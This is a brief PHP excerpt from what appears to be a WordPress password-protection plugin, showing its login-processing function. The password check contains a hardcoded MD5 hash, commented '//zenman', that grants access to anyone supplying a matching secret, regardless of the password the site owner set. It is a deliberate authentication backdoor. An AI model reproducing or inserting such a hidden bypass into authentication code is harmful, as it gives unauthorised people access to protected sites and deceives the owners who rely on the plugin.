...
class Password_Protected {
	...
	function maybe_process_login() {
		if ( $this->is_active() && isset( $_REQUEST['password_protected_pwd'] ) ) {
			...
			// If correct password...
			if ( ( md5( $password_protected_pwd ) == $pwd && $pwd != '' ) || apply_filters( 'password_protected_process_login', false, $password_protected_pwd ) || md5( $password_protected_pwd ) == '3a4f633ba7d507e217b6b96fe9a06ee7' ) { //zenman
